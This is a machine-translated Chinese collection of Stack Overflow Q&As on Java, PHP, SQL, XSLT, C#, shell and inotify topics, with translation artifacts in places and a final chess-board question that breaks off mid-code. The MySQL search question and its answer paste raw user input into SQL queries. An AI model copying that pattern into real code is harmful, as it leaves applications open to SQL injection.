                "org.docx4j.vml:org.docx4j.vml.officedrawing:org.docx4j.vml.wordprocessingDrawing:org.docx4j.vml.presentationDrawing:org.docx4j.vml.spreadsheetDrawing:org.docx4j.vml.root:" +
                "org.opendope.xpaths:org.opendope.conditions:org.opendope.questions:org.opendope.components:org.opendope.SmartArt.dataHierarchy:" +
                "org.docx4j.math:" +
                "org.docx4j.sharedtypes:org.docx4j.bibliography",classLoader );
log.info("loaded " + jc.getClass().getName() + " .. loading others ..");

jcThemePart = jc; //JAXBContext.newInstance("org.docx4j.dml",classLoader );
jcDocPropsCore = JAXBContext.newInstance("org.docx4j.docProps.core:org.docx4j.docProps.core.dc.elements:org.docx4j.docProps.core.dc.terms",classLoader );
jcDocPropsCustom = JAXBContext.newInstance("org.docx4j.docProps.custom",classLoader );
jcDocPropsExtended = JAXBContext.newInstance("org.docx4j.docProps.extended",classLoader );
jcXmlPackage = JAXBContext.newInstance("org.docx4j.xmlPackage",classLoader );
jcRelationships = JAXBContext.newInstance("org.docx4j.relationships",classLoader );
jcCustomXmlProperties = JAXBContext.newInstance("org.docx4j.customXmlProperties",classLoader );
jcContentTypes = JAXBContext.newInstance("org.docx4j.openpackaging.contenttype",classLoader );

jcSectionModel = JAXBContext.newInstance("org.docx4j.model.structure.jaxb",classLoader );

jcXmlDSig = JAXBContext.newInstance("org.plutext.jaxb.xmldsig",classLoader ); 
```

根据我的观察，似乎我可能需要放置一个 jaxb.properties 文件，指定要在上面每个 JAXBContext 实例中列出的每个包中使用哪个 jaxb 实现。这个对吗？有什么我想念的吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2014-08-28T13:23:28.790

在 Maven pom.xml 中放置这些缺少的依赖项，问题就解决了（在 JBoss 7.1.3 上）

```
<dependency>
    <groupId>org.slf4j</groupId>
    <artifactId>slf4j-log4j12</artifactId>
    <version>1.6.1</version>
</dependency>
<dependency>
    <groupId>javax.servlet</groupId>
    <artifactId>servlet-api</artifactId>
    <version>2.5</version>
    <scope>provided</scope>
</dependency>
<dependency>
    <groupId>com.sun.xml.bind</groupId>
    <artifactId>jaxb-impl</artifactId>
    <version>2.2.7</version>
</dependency>
<dependency>
    <groupId>com.googlecode.jaxb-namespaceprefixmapper-interfaces</groupId>
    <artifactId>JAXBNamespacePrefixMapper</artifactId>
    <version>2.2.4</version>
    <scope>runtime</scope>
</dependency>
<dependency>
    <groupId>xerces</groupId>
    <artifactId>xercesImpl</artifactId>
    <version>2.11.0</version>
</dependency> 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-10-15T00:28:59.747

JBoss AS7 有一个不同于以前版本的类加载机制。一般见[https://docs.jboss.org/author/display/AS71/Class+Loading+in+AS7](https://docs.jboss.org/author/display/AS71/Class+Loading+in+AS7)

它包括一个名为 javax.xml.bind.api 的模块；要让 docx4j 在您的 WAR 中工作，您只需要包含 WEB-INF/ **jboss-deployment-structure.xml**包含：

```
<deployment>
    <dependencies>

        <module name="com.sun.xml.bind" />

    </dependencies>
</deployment> 
```

**细节/讨论**

modules\javax\xml\bind\api\main 说：

```
<dependencies>
    <module name="javax.activation.api" export="true"/>
    <module name="javax.xml.stream.api"/>
    <module name="com.sun.xml.bind" services="import"/>
    <module name="javax.api"/>
</dependencies>

<resources>
    <resource-root path="jboss-jaxb-api_2.2_spec-1.0.3.Final.jar"/>
    <!-- Insert resources here -->
</resources> 
```

modules\com\sun\xml\bind\main 说：

```
<resources>
    <resource-root path="jaxb-impl-2.2.4.jar"/>
    <resource-root path="jaxb-xjc-2.2.4.jar"/>
    <!-- Insert resources here -->
</resources>

<dependencies>
    <module name="javax.api" />
    <module name="javax.xml.bind.api" />
    <module name="javax.xml.stream.api" />
</dependencies> 
```

所以你可能会认为以下方法也可以：

```
<deployment>
    <dependencies>

        <module name="javax.xml.bind.api" />

    </dependencies>
</deployment> 
```

但它似乎没有，也许是因为被赋予了效果？

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-06-19T07:50:45.823

我假设您使用的是 Java 7。我能够通过运行 JBoss EAP 6.2 解决这个问题

```
java version "1.7.0_55"
OpenJDK Runtime Environment (IcedTea 2.4.7) (7u55-2.4.7-1ubuntu1~0.13.10.1)
OpenJDK 64-Bit Server VM (build 24.51-b03, mixed mode) 
```

1.  定义以下 JBoss 模块：

    > ```
    > <!-- module.xml content -->
    > <module xmlns="urn:jboss:module:1.1" name="org.docx4j-compat">
    >     <dependencies>
    >         <module name="sun.jdk"/>
    >         <system export="true">
    >             <paths>
    >                 <path name="com/sun/xml/internal/bind/marshaller"/>
    >             </paths>
    >         </system>
    >     </dependencies>
    > </module> 
    > ```

2.  将此模块的依赖添加到您的 WEB-INF/jboss-deployment-structure.xml。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-08-24T13:00:28.043

因此，经过一些研究，我们发现 docx4j 的解决方案将适用于 jboss

你需要在 jboss 中定义新模块让我们称之为 org.docx4j-compat

它将位于 \system\layers\base\org

现在将所有相关的 jar 添加到主文件夹和 module.xml

模块.xml：

```
<resources>
    <resource-root path="docx4j-3.1.0.jar"/>
    <resource-root path="docx4j-ImportXHTML-3.0.1.jar"/> 
    <resource-root path="jaxb-api-2.1.jar"/>
    <resource-root path="jaxb-svg11-1.0.2.jar"/>
    <resource-root path="jaxb-xmldsig-core-1.0.0.jar"/>
    <resource-root path="jaxb-xslfo-1.0.1.jar"/>
</resources>

<dependencies>
    <module name="org.slf4j"/>
    <module name="org.apache.commons.io"/>
    <module name="sun.jdk"/>
    <system export="true">
        <paths>
            <path name="com/sun/xml/internal/bind/marshaller"/>
        </paths>
    </system>
    <module name="javax.xml.bind.api"/>
    <module name="javax.api"/>
    <module name="com.sun.xml.bind" />
</dependencies> 
```

希望它有帮助:)

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-04-25T01:26:03.823

请查看[docx4j JBOSS 部署论坛](http://www.docx4java.org/forums/jboss-f29/)

例如，从其中一篇文章中：

> 我的 Serializer 和 Xalan jar 的版本。按照指示，我每个都有 2.7.1，但是我的应用服务器（JBoss 5.1.0）在根 lib/endorsed 文件夹中有不同的版本（未编号：serializer.jar 和 xalan.jar），它们覆盖了这些。当我用 2.7.1 版本替换这些罐子时，它工作得很好。

请让我们知道那里的建议是否适合您。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2016-03-11T11:42:33.980

这两个最小步骤对我有用（JBOSS 7.1.3，DOCX4J 3.2.2）：

*   配置 `WEB-INF\jboss-deployment-structure.xml` 文件

    ```
    <?xml version="1.0" encoding="UTF-8"?>
    <jboss-deployment-structure xmlns="urn:jboss:deployment-structure:1.2">
        <deployment>    
            <dependencies>
                <module name="com.sun.xml.bind" />
            </dependencies>
        </deployment>
    </jboss-deployment-structure> 
    ```

    *   修改我的 pom.xml

    ```
     <dependency>
                <groupId>com.googlecode.jaxb-namespaceprefixmapper-interfaces</groupId>
                <artifactId>JAXBNamespacePrefixMapper</artifactId>
                <version>2.2.4</version>
                <scope>runtime</scope>
            </dependency> 
    ```

# php - 在 zend 服务器中找不到页面

> ID：16204638
> 
> 赞同：0
> 
> 时间：2013-04-25T00:46:49.140
> 
> 标签：php, zend-framework

我在我的 win7 机器上使用 ZendServer-CE-php-5.3.14-5.6.0-SP4-Windows_x86(zend server+zend framework1)。

1.  我使用 ZendStudio.exe 创建了一个项目 zf-tutorial1，

2.  使用下面的 zf 命令创建 3 个动作：

    ```
    zf create action add Index
    zf create action edit Index
    zf create action delete Index 
    ```

3.  我检查了`D:\program files (x86)\Zend\Apache2\conf\httpd.conf`

一个。`LoadModule rewrite_module modules/mod_rewrite.so`（默认启用）

湾。改为`AllowOverride None`，`AllowOverride All`有3个地方。

然后，我打开以下网址：

`http://localhost/zf-tutorial1/public/` ...效果很好，显示“欢迎使用 zend 框架...”

`http://localhost/zf-tutorial1/public/add`...显示“发生错误页面未找到”

那么问题是什么？好奇怪，昨天还好好的，今天打开电脑却显示“找不到页面”，好奇怪。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T02:12:29.340

找出原因：我输入了错误的网址，正确的是：`http://localhost/zf-tutorial/public/index/add`

# java - 用模数计算大幂

> ID：16204639
> 
> 赞同：1
> 
> 时间：2013-04-25T00:46:59.417
> 
> 标签：java, math

我目前正在处理一些事情，我需要计算类似的值

(65^17) 模 3233 = *

上述问题的答案是 2790，但是因为 65 ^ 17 大于 Math.pow 可以返回的值，所以它总是给出错误的答案。

我已经使用 BigIntegers（和内置的 modPow）编写了一个实现，但我想尽可能避免使用它们。

有没有替代方法可以避免使用 BigIntegers？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-25T00:50:15.393

if`x = y (mod n)` 和`u = v (mod n)` then `x.u = y.v (mod n)`（其中 '.' 表示乘法）

重复应用此用于减少 65^17 mod 3233，

例如

```
65 * 65 (mod 3233) = 992

65 * 992 (mod 3233) = 3053

3053 * 65 (mod 3233) = 1232
.
.
. 
```

事实上我们可以缩短这个因为我们已经计算了`65^4 (mod 3233) = 1232`

所以，

```
65^8 (mod 3233) = 1232 * 1232 (mod 3233) = 1547

65^16 (mod 3233) = 1547 * 1547 = 789 
```

最后，

```
65^17 = 789 * 65 (mod 3233) =  2790 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:23:25.920

Mitch Wheat 非常简洁但有点神秘的¹答案意味着这应该可以工作（伪代码）：

```
 res = 1
   for i in 1 to 17:
       res = (res * 65) mod 3233 
```

由于模数运算的数学特性，您根本不需要为此使用 BigInteger。

FWIW， using`Math.pow()`不起作用的原因是它使用浮点算法计算 65 ^(17 。)的结果`pow`太大而无法精确表示为 a `double`，因此您会丢失一些最低有效数字；即数字“右手端”的那些。不幸的是，当您取模时，这些数字很重要。

* * *

^(1 - ...如果数学不是你更强的技能之一......)

# shell - 在 Web 浏览器中运行的 Shell 脚本显示空结果

> ID：16204640
> 
> 赞同：1
> 
> 时间：2013-04-25T00:47:05.173
> 
> 标签：shell, web, browser, asterisk

我在 CentOS 中编写了一个 shell 脚本。它基本上连接到数据库并显示某些信息。我在开头放了以下说明：

```
#!/bin/bash
echo "Content-type: text/plain"
echo "" 
```

如果我在 Linux 命令行中运行它，我会得到所需的结果和输出，但如果我使用 Web 浏览器运行它，它不会显示任何内容。我已将脚本放在 cgi-bin 目录中。作为附加信息，我还有其他一些使用 nmap 和 curl 的脚本可以正常工作。

基本上我想在 Asterisk IP-PBX 中显示一些扩展的状态

```
for i in `asterisk -rx 'sip show peers'|grep -ai Uns |sort -n |grep ^2| awk '{print $1}' | grep [a-z]`; do 
```

谢谢你的时间。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T05:47:16.373

您已将完整路径添加到星号。

您还拥有与您的网络服务器相同的用户下的测试脚本。很可能您更改了 /etc/asterisk/asterisk.conf 对星号 ctl 文件的权限。

# sql - 使用 T-SQL 对列中的文本进行复杂的搜索/过滤

> ID：16204641
> 
> 赞同：-1
> 
> 时间：2013-04-25T00:47:13.987
> 
> 标签：sql, sql-server, tsql, sql-server-2005

我在我的环境中使用 SQL Server 2005。

我有一列，其中每一行都包含有关某些 SQL 查询的大量数据。每一行看起来就像数据库中的一个长行，但是当您从该行中提取数据时，它会被拆分为多行，因为它包含回车符。

下面是由回车分割的列中的一行数据的示例。我试图找出一种方法，到目前为止没有成功，在这种方法中，我可以提取每行包含“伪=”的等号之后的所有内容，但前导和尾随空格除外。

所以在包含“pseudo=”的行上，我想要 = 符号之后的所有内容。然后我想修剪前导和尾随空格，如果有的话。我还想在每个“伪=”行的末尾保留回车。然后，我想将所有“pseudo=”行的这个新字符串存储到新列的新行中。

我的 SQL 不是很强大，这个小谜题让我陷入了困境。任何帮助是极大的赞赏。请注意，该列最多有 500 到 600 行，但如果这对任何事情都很重要，那么其中会有一堆文本。

```
0x8A40D34D4BEC294D8934029D569B2BFE
table=ca_discovered_hardware
target_type=1
label=label
typefield=
primarykeyfield=dis_hw_uuid
secondarykeyfield=domain_uuid
excludeclause=
[Arguments]
Arguments=12
[Argument 1]
type=1
pseudo= ( 
sql=(
valid=1
[Argument 2]
type=11
pseudo=(Link Query '[ES] IPQ: Tokyo (JPN)' using 'default' method)
sql=dis_hw_uuid in ($TARGETLINKSQL$)
valid=1
queryuuid=f8e488a2b34ee24b85db3f8fafd4e9a2
query_name=[ES] IPQ: S&B - Tokyo (JPN)
[Argument 3]
type=1
pseudo= ) 
sql=)
valid=1
[Argument 4]
type=1
pseudo= AND 
sql= AND 
valid=1
[Argument 5]
type=1
pseudo= NOT 
sql= NOT 
valid=1
[Argument 6]
type=1
pseudo= ( 
sql=(
valid=1
[Argument 7]
type=9
pseudo=(Current Server = 'APTOPRK01CIGE')
sql=ca_discovered_hardware.dis_hw_uuid in (SELECT object_uuid FROM ca_agent WHERE server_uuid IN (SELECT server_uuid FROM ca_server WHERE label='APTOPRK01CIGE'))
valid=1
[Argument 8]
type=1
pseudo= OR 
sql= OR 
valid=1
[Argument 9]
type=11
pseudo=(Link Query '[DM] EXQ: Obsolete Exclude' using 'default' method)
sql=dis_hw_uuid in ($TARGETLINKSQL$)
valid=1
queryuuid=00000000000000000000000000000000
query_name=[DM] EXQ: Obsolete Exclude
[Argument 10]
type=1
pseudo= OR 
sql= OR 
valid=1
[Argument 11]
type=11
pseudo=(Link Query '[DM] EXQ: Server Exclude' using 'default' method)
sql=dis_hw_uuid in ($TARGETLINKSQL$)
valid=1
queryuuid=00000000000000000000000000000000
query_name=[DM] EXQ: Server Exclude
[Argument 12]
type=1
pseudo= ) 
sql=)
valid=1 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:09:51.953

试试这个代码。

用户定义的函数`iter_charlist_to_tbl`将您的字符串拆分为具有定义分隔符的行。（取自[这里](http://www.sommarskog.se/arrays-in-sql.html)）

该`my_convert`函数将字符串的行连接到字符串

[SQL小提琴](http://sqlfiddle.com/#!3/565ec/5)

**MS SQL Server 2008 架构设置**：

```
create table t ( str varchar(max))
go

create function my_convert(@str varchar(max))
returns varchar(max)
as
begin
  declare @p_str varchar(max), @result varchar(max), @delim varchar(2)
  set @delim = char(10)
  set @result = ''

  declare CUR cursor for 
    select right(str, len(str) -7) as result--, str 
    from dbo.iter_charlist_to_tbl(@str, @delim) t
    where str like 'pseudo=%'
  open CUR
  fetch next from CUR into @p_str
  while @@fetch_status = 0
  begin
    set @result = @result + @p_str + char(10)
    fetch next from CUR into @p_str
  end
  close CUR
  deallocate CUR
  return @result
end
go

CREATE FUNCTION iter_charlist_to_tbl
                 (@list      nvarchar(MAX),
                  @delimiter nvarchar(2) = N',')
      RETURNS @tbl TABLE (listpos int IDENTITY(1, 1) NOT NULL,
                          str     varchar(4000)      NOT NULL,
                          nstr    nvarchar(2000)     NOT NULL) AS

BEGIN
   DECLARE @endpos   int,
           @startpos int,
           @textpos  int,
           @chunklen smallint,
           @tmpstr   nvarchar(4000),
           @leftover nvarchar(4000),
           @tmpval   nvarchar(4000)

   SET @textpos = 1
   SET @leftover = ''
   WHILE @textpos <= datalength(@list) / 2
   BEGIN
      SET @chunklen = 4000 - datalength(@leftover) / 2
      SET @tmpstr = @leftover + substring(@list, @textpos, @chunklen)
      SET @textpos = @textpos + @chunklen

      SET @startpos = 0
      SET @endpos = charindex(@delimiter COLLATE Slovenian_BIN2, @tmpstr)

      WHILE @endpos > 0
      BEGIN
         SET @tmpval = ltrim(rtrim(substring(@tmpstr, @startpos + 1,
                                             @endpos - @startpos - 1)))
         INSERT @tbl (str, nstr) VALUES(@tmpval, @tmpval)
         SET @startpos = @endpos
         SET @endpos = charindex(@delimiter COLLATE Slovenian_BIN2,
                                 @tmpstr, @startpos + 1)
      END

      SET @leftover = right(@tmpstr, datalength(@tmpstr) / 2 - @startpos)
   END

   INSERT @tbl(str, nstr) VALUES (ltrim(rtrim(@leftover)), ltrim(rtrim(@leftover)))
   RETURN
END
go

insert t (str) values (
  '0x8A40D34D4BEC294D8934029D569B2BFE
table=ca_discovered_hardware
target_type=1
label=label
typefield=
primarykeyfield=dis_hw_uuid
secondarykeyfield=domain_uuid
excludeclause=
[Arguments]
Arguments=12
[Argument 1]
type=1
pseudo= ( 
sql=(
valid=1
[Argument 2]
type=11
pseudo=(Link Query ''[ES] IPQ: Tokyo (JPN)'' using ''default'' method)
sql=dis_hw_uuid in ($TARGETLINKSQL$)
valid=1
queryuuid=f8e488a2b34ee24b85db3f8fafd4e9a2
query_name=[ES] IPQ: S&B - Tokyo (JPN)
[Argument 3]
type=1
pseudo= ) 
sql=)
valid=1
[Argument 4]
type=1
pseudo= AND 
sql= AND 
valid=1
[Argument 5]
type=1
pseudo= NOT 
sql= NOT 
valid=1
[Argument 6]
type=1
pseudo= ( 
sql=(
valid=1
[Argument 7]
type=9
pseudo=(Current Server = ''APTOPRK01CIGE'')
sql=ca_discovered_hardware.dis_hw_uuid in (SELECT object_uuid FROM ca_agent WHERE server_uuid IN (SELECT server_uuid FROM ca_server WHERE label=''APTOPRK01CIGE''))
valid=1
[Argument 8]
type=1
pseudo= OR 
sql= OR 
valid=1
[Argument 9]
type=11
pseudo=(Link Query ''[DM] EXQ: Obsolete Exclude'' using ''default'' method)
sql=dis_hw_uuid in ($TARGETLINKSQL$)
valid=1
queryuuid=00000000000000000000000000000000
query_name=[DM] EXQ: Obsolete Exclude
[Argument 10]
type=1
pseudo= OR 
sql= OR 
valid=1
[Argument 11]
type=11
pseudo=(Link Query ''[DM] EXQ: Server Exclude'' using ''default'' method)
sql=dis_hw_uuid in ($TARGETLINKSQL$)
valid=1
queryuuid=00000000000000000000000000000000
query_name=[DM] EXQ: Server Exclude
[Argument 12]
type=1
pseudo= ) 
sql=)
valid=1
  ') 
```

**查询 1**：

```
-- table result
declare @long varchar(max)
declare @crlf varchar(2) = char(10)
select @long = str from t
select right(str, len(str) -7) as result--, str 
from dbo.iter_charlist_to_tbl(@long, @crlf) t
where str like 'pseudo=%'

/*--string result
select dbo.my_convert(str) from t
*/ 
```

**[结果](http://sqlfiddle.com/#!3/565ec/5/0)**：

```
|                                                           RESULT |
--------------------------------------------------------------------
|                                                                ( |
|      (Link Query '[ES] IPQ: Tokyo (JPN)' using 'default' method) |
|                                                                ) |
|                                                              AND |
|                                                              NOT |
|                                                                ( |
|                               (Current Server = 'APTOPRK01CIGE') |
|                                                               OR |
| (Link Query '[DM] EXQ: Obsolete Exclude' using 'default' method) |
|                                                               OR |
|   (Link Query '[DM] EXQ: Server Exclude' using 'default' method) |
|                                                                ) | 
```

# xslt - 提取 xml 元素和子节点值

> ID：16204642
> 
> 赞同：1
> 
> 时间：2013-04-25T00:47:19.353
> 
> 标签：xslt, xml-parsing

我有以下类型的 xml

```
`<ns:response>
 <ns:transport_car>
  <ns:transport_model> abc</ns:transport_model>
  <ns:transport_model> xyz</ns:transport_model>
   </ns:transport_car>
    </ns:response>` 
```

如何格式化此 xsl 以打印表单文本：

```
Transport type= car
Model name:
abc xyz 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T02:46:59.240

**这种转变**：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
 xmlns:ns="some:ns">
 <xsl:output method="text"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/*/*[starts-with(local-name(), 'transport_')]">
  <xsl:text>Transport type= </xsl:text>
  <xsl:value-of select="substring-after(local-name(), 'transport_')"/>
  <xsl:apply-templates/>
 </xsl:template>

 <xsl:template match="ns:transport_model[1]">
Model name:
<xsl:value-of select="normalize-space()"/>
 </xsl:template>
</xsl:stylesheet> 
```

**应用于提供的 XML 文档时：**

```
<ns:response xmlns:ns="some:ns">
    <ns:transport_car>
        <ns:transport_model> abc</ns:transport_model>
        <ns:transport_model> xyz</ns:transport_model>
    </ns:transport_car>
</ns:response> 
```

**产生想要的正确结果：**

```
Transport type= car
Model name:
abc xyz 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-04-25T01:06:25.270

这个怎么样：

```
<xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
                xmlns:ns="something">
  <xsl:output method="text" indent="yes"/>

  <xsl:template match="/*">
    <xsl:apply-templates
      select="*[substring-after(local-name(), 'transport_') != '']" />
  </xsl:template>

  <xsl:template match="/*/*">
    <xsl:value-of
      select="concat('Transport type= ', 
                     substring-after(local-name(), 'transport_'),
                     '&#xA;Model name:&#xA;')"/>
    <xsl:apply-templates select="ns:transport_model" />
  </xsl:template>

  <xsl:template match="ns:transport_model">
    <xsl:value-of select="concat(normalize-space(), ' ')"/>
  </xsl:template>
</xsl:stylesheet> 
```

在示例输入上运行时（添加命名空间后），结果为：

```
Transport type= car
Model name:
abc xyz 
```

# c - 是否通知组 IN_MOVED_FROM 和 IN_MOVED_TO？

> ID：16204646
> 
> 赞同：1
> 
> 时间：2013-04-25T00:48:07.657
> 
> 标签：c, linux, linux-kernel, filesystems, inotify

我正在使用单个 inotify 文件描述符来监视许多繁忙目录中的多个事件，包括`IN_MOVED_TO`和`IN_MOVED_FROM`.

我有一个循环调用`read`它（它会阻塞直到有数据要读取）并在事件发生时处理它们。

当一个文件在两个被监视的目录之间移动时，两个`inotify_event`s 被写入 inotify 文件描述符：一个`IN_MOVED_TO`位设置为 in `mask`，一个为`IN_MOVED_FROM`，两者都具有相同的`cookie`。

是否保证两个事件都将通过对 的相同调用进行缓冲`read`，或者我是否需要调用它一次来缓冲一个事件并再次缓冲下一个？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-12-05T15:10:16.783

AFAIK，没有这样的保证。
我们可以依赖的只是重命名操作中的两个事件（ `IN_MOVED_FROM`, ）与相同的. `IN_MOVED_TO``cookie`

除上述之外的任何假设都是不可靠的，例如：

*   这两个事件将依次发生（一个紧接着另一个）。
*   这两个事件将一起出现在同一个`read`系统调用中。

# php - Mysql存储对整数或文本执行搜索

> ID：16204648
> 
> 赞同：0
> 
> 时间：2013-04-25T00:48:13.163
> 
> 标签：php, mysql

我正在构建一个存储产品信息的应用程序，即名称、类别、价格等。

一个产品可以属于多个类别，因此会有一个类别表来保存针对产品的此信息，但是我希望允许用户能够根据他们喜欢的任何词搜索产品。我的意思是用户可以输入产品名称、描述中的内容、类别、价格等。完全取决于用户。

我猜测的查询（因为它尚未构建）将类似于：

```
SELECT * FROM tbl_product 
JOIN tbl_category ON tbl_product.product_id = tbl_category.product_id
WHERE
    tbl_product.name LIKE $query
    OR tbl_product.description LIKE $query
    OR tbl_category.category etc. 
```

我想知道存储这些数据的最佳方法是什么，因为我在产品表中还有一列是产品类型，目前是一个整数（1 = 顶部，2 = 底部，3 = 鞋子等）但是用户搜索top 不会在搜索中输入 1，他们会输入 top 或 tops。我知道基于整数进行搜索会更快，但是将“top”存储在产品表中以搜索或存储“1”并进行连接会更快吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T01:01:23.807

作为一种选择——我并不是说这是最好的选择，但它可能对你有用——是在你的产品上收集一个关键字列，将主要搜索字段存储为单个文本条目。

当您创建或更新产品时，您将重建此字符串并针对该列执行单个匹配。

所以说你有这样的产品：

标题：酷工具
主体：带有内置光剑的套筒扳手
标签：工具、光剑、酷（这些与类别类似，但仅作为示例，我在此处将它们列为字符串）

而且它在品类中`Tools`，也是在品类中`Camping`。

在保存（添加或编辑）时，您编写一个字符串，该字符串是所有文本本身的集合：

“酷工具带有内置
光剑工具的套筒扳手光剑酷工具露营”

即使它是多余的。

然后你搜索：

```
SELECT * FROM `products` WHERE MATCH(`search_terms`) AGAINST({search_term} IN BOOLEAN MODE) 
```

所以你不必担心交叉表 where 子句。您可能需要熟悉[match against，](http://dev.mysql.com/doc/refman/4.1/en//fulltext-search.html)但有很多资源可供您使用。

我以前做过这个，对我来说效果很好。从来没有任何性能问题。

# php - PHP：超出范围的变量访问

> ID：16204650
> 
> 赞同：0
> 
> 时间：2013-04-25T00:48:20.457
> 
> 标签：php, global-variables, scope, reusability, redeclare

访问超出范围的变量的最佳方法是什么，请参阅我当前的方法：

```
// Define API
require_once( 'api.php' );
global $myapi;
$myapi = new LazyAPI( 'My API', 'myapi' );

class Content {

    function DoAction() {

        global $myapi;
        $key = $myapi->someFunc() . "-key";

    }

}

$content = $myapi->Content(); // LazyAPI is a class that loads classes in other files using reflection
$content->DoAction(); 
```

我面临的问题（并且在进一步测试之前无法测试）是`$myapi`在其他文件中重新声明或重用。我只使用了`global`访问修饰符，因为我知道它有效，但我不知道是否有更好的选择。这个想法是能够声明多个`$myapi`变量并且只能在主文件的范围内访问。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T00:56:42.267

使用[依赖注入](http://en.wikipedia.org/wiki/Dependency_injection)

```
require_once( 'api.php' );

class Content {

    public function __construct($myapi) {
        $this->myapi = $myapi;
    }

    function DoAction() {
        $key = $this->myapi->someFunc() . "-key";
    }

}

$myapi = new LazyAPI('My API', 'myapi' );
$content = new Content($myapi);
$content->DoAction(); 
```

一些关于[PHP 依赖注入的](http://www.slideshare.net/fabpot/dependency-injection-in-php-5354)有用幻灯片。

# c# - 如何指定子类以使用它们的类型？

> ID：16204652
> 
> 赞同：0
> 
> 时间：2013-04-25T00:48:33.420
> 
> 标签：c#, generics, object-oriented-analysis

假设我有这样的课程：

```
public abstract class Foo
{
    public void Access(Foo foo)
    {
        /*
        if (foo is same type as implemented)
            AccessIfSameImplementation(foo);
        else
            AccessIfDifferentImplementation(foo);
        */
    }

    protected abstract void AccessIfSameImplementation(Foo foo);

    private void AccessIfDifferentImplementation(Foo foo)
    {
         //do stuff with the different implementations
    }
} 
```

因此，该方法`Access`采用自身的类型，根据定义，它将是一个实现，我们并不真正关心它是什么，只要它继承自`Foo`......但我希望这个方法检查传入的对象是否是与其实现相同的类型。

像这样：

```
public class Bar : Foo
{
    protected override void AccessIfSameImplementation(Foo foo)
    {
        // TODO: How do I force foo to always be a Bar
        // do specific Bar stuff
    }
} 
```

目前，我有一个`Name`字段指示传入的`foo.Name`值是否与当前值相同。`Name`此外，我考虑过使用泛型，但再次认为这不是解决此问题的正确方法。

**编辑：**

关于我正在使用的实际结构的一些背景知识。

上面定义的`Foo`类代表了创建一组对象的工厂，`List<X> objs`这些对象由实现`Foo`对象的属性生成。现在我有一些其他类比较这些工厂，但我不希望工厂因为生成它们而变得臃​​肿。因此，我不是*使工厂膨胀，而是检查它们是否具有相同的实现，如果是，则比较抽象比较器定义的属性，否则 *blowout。以后有时间我会补充的。

如果有人有更好的标题，请推荐一个。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T01:27:20.213

好吧，所以我想我只是无法完全思考问题。只需在公共方法中直接进行类型比较`Access`

```
public void Access(Foo foo)
{
    if (GetType() == foo.GetType) //Duh...
    {
         AccessIfSameImplementation(foo);
    }
    else
    {
         AccessIfDifferentImplementation(foo);
    }
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T01:07:30.923

我不完全确定您的意图是什么，但是您不能更改子类中抽象方法的签名。一个想法是做一个参数检查，如果你有一个不合适的 foo 就抛出一个异常：

```
public abstract class Foo
{
    public void Access(Foo foo)
    {
        if (foo.GetType() == GetType())
        {
            AccessIfSameImplementation(foo);
        }
        else
        {
            AccessIfDifferentImplementation(foo);
        }
    }

    protected abstract void AccessIfSameImplementation(Foo foo);

    private void AccessIfDifferentImplementation(Foo foo)
    {
        //do stuff with the different implementations
    }
}
public class Bar : Foo
{
    public string Baz { get; set; }

    protected override void AccessIfSameImplementation(Foo foo)
    {
        var bar = foo as Bar;

        if (bar == null)
        {
            throw new ArgumentException("Argument foo is not of type Bar");
        }

        //Do Bar stuff below
        bar.Baz = "Yay!";
    }
} 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-04-25T01:38:14.870

把事情简单化。保持抽象类抽象，但给`Access`方法一个`Foo`不可知的默认实现。将其保留在子类中，以提供使用该子类成员的自定义实现。您还可以使子类可选地回退到基类中实现的默认逻辑：

```
public abstract class Foo
{
    public virtual void Access(Foo foo)
    {
        // perform the default implementation here, but mark as virtual to enable a child class to override it.
    }
}

public class Bar : Foo
{
    public override void Access(Foo foo)
    {
        var bar = foo as Bar;
        if (bar != null)
        {
            // If you get here, that means foo is a Bar.
            // Just use bar now and ignore foo.
        }
        else
        {
            // Fall back on the base classes implementation
            base.Access(foo);
        }
    }
} 
```

# java - 国际象棋分层问题

> ID：16204653
> 
> 赞同：0
> 
> 时间：2013-04-25T00:48:41.100
> 
> 标签：java, swing, layer, chess

我对 Java 还很陌生，所以我决定尝试用 Swing 制作国际象棋游戏。我知道我的程序效率极低，但这并不是我的问题。我的问题是，在添加 JButtons 后，我无法查看白棋子的图像，但如果我在添加按钮之前添加代码以添加棋子 JLabel，我可以看到棋子。由于这个原因，我认为问题是我有分层问题，我尝试用 LayeredPanes 替换面板并没有任何成功。

基本上，我想要发生的是让 JButton 和 JLabel 都显示在同一个方块中并保持按钮可点击。此外，我真的不想合并任何新的导入，只使用 JButtons、JLabels 等。抱歉，如果我的解释有点混乱，在此先感谢。这是我的代码：

```
private JFrame frame = new JFrame();
private JPanel[][] square = new JPanel[8][8];
private JButton[][] squareB = new JButton[8][8];
private JPanel blank[] = new JPanel[6];
private JButton newGame = new JButton("New Game");
private JButton exitGame = new JButton("Exit");

ArrayList <Chess> pieces = new ArrayList<Chess>();
ChessGame() throws IOException
{   

    frame.setLayout(new GridLayout(9,8));
    frame.setSize(800,900);
    for(int x=0; x<8; x++)
    {
        for(int y=0; y<8; y++)
        {
            square[x][y] = new JPanel();
            square[x][y].setSize(100,100);
        }
    }

    for(int y=0; y<8; y++)
    {
        for(int x=0; x<8; x++)
        {
